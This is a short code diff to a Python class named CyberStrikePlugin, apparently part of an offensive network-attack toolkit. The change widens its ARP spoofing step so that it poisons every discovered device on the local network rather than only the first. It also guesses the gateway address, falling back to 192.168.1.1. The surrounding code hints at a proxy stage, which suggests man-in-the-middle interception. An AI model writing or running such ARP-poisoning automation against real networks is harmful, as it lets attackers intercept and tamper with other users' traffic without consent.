@@ -81,19 +81,15 @@ class CyberStrikePlugin(BasePlugin):
 
                 elif plugin_name == "Spoofer":
                     self.log.append("Initiating ARP spoofing...")
-                    await plugin.start()
-                    # Spoof the first discovered device if available
                     devices = ctx.get("devices", [])
-                    if devices:
-                        target = devices[0].get("ip")
-                        gateway = next(
-                            (d.get("ip") for d in devices
-                             if d.get("ip", "").endswith(".1") or d.get("ip", "").endswith(".254")),
-                            None
-                        )
-                        if target and gateway:
-                            await plugin.spoof(target_ip=target, gateway_ip=gateway)
-                            self.log.append(f"ARP spoof active: {target} ↔ {gateway}")
+                    targets = [d.get("ip") for d in devices if d.get("ip")]
+                    gateway = next(
+                        (d.get("ip") for d in devices
+                         if d.get("ip", "").endswith(".1") or d.get("ip", "").endswith(".254")),
+                        "192.168.1.1",
+                    )
+                    await plugin.start(targets=targets or None, gateway=gateway)
+                    self.log.append(f"ARP spoof active on {len(targets)} targets via {gateway}")
                     self.emit("SPOOF_ACTIVE", {"msg": "ARP poisoning engaged"})
 
                 elif plugin_name == "Proxy":
